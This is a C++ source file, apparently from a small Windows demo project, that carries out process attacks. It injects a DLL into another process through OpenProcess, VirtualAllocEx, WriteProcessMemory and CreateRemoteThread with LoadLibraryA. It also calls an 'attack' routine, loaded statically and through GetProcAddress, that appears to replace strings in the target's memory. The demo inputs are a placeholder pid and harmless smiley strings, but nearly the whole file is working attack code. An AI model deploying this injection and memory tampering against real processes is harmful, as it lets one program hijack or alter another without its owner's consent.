#include <iostream>
#include <utility>
#include "windows.h"
#include "../arrow/arrow.h"

void staticAttack(pid_t pid, std::string source, std::string replacement) {
    attack(pid, std::move(source), std::move(replacement));
}

void dynamicAttack(pid_t pid, const char *lib, std::string source, std::string replacement) {
    typedef void(*change)(pid_t pid, std::string source, std::string replacement);

    HMODULE libraryHandle = LoadLibraryA(lib);
    if (!libraryHandle) {
        std::cout << "Can't load library" << std::endl;
        return;
    }

    auto func = (change) GetProcAddress(libraryHandle, "attack");
    if (!func) {
        std::cout << "Can't find the function" << std::endl;
        std::cout << GetLastError() << std::endl;
        return;
    }

    func(pid, std::move(source), std::move(replacement));
}


void remoteInjectAttack(pid_t pid, const char *dllPath) {
    HANDLE targetProcess;

    targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (targetProcess) {

        LPVOID loadLib = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        if (loadLib) {

            LPVOID remoteString = (LPVOID) VirtualAllocEx(targetProcess, NULL, strlen(dllPath) + 1,
                                                          MEM_RESERVE | MEM_COMMIT,
                                                          PAGE_READWRITE);
            if (remoteString) {
                // Write the string name of the dll in the memory allocated
                if (WriteProcessMemory(targetProcess, (LPVOID) remoteString, dllPath, strlen(dllPath) + 1, NULL)) {
                    HANDLE createdThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLib,
                                                              (LPVOID) remoteString, 0, NULL);
                    if (createdThread) {
                        WaitForSingleObject(createdThread, INFINITE);
                        std::cout << "Injected DLL" << std::endl;
                        CloseHandle(createdThread);
                    } else {
                        std::cout << "Error creating remote thread" << std::endl;
                    }
                } else {
                    std::cout << "Error writing to process memory" << std::endl;
                }
                
                VirtualFreeEx(targetProcess, remoteString, 0, MEM_RELEASE);
            } else {
                std::cout << "Error allocating memory for remote string" << std::endl;
            }
        } else {
            std::cout << "Error getting LoadLibraryA from kernel32.dll" << std::endl;
        }

        CloseHandle(targetProcess);
    } else {
        std::cout << "Error in OpenProcess()" << std::endl;
    }

}

int main() {
    pid_t pid = -1;
    const char *lib = "../../arrow/cmake-build-debug/libarrow.dll";

    remoteInjectAttack(pid, lib);
    Sleep(2000);
    staticAttack(pid, "_12345", ":)");
    Sleep(2000);
    dynamicAttack(pid, lib, ":)", "^_^");

    return 0;
}
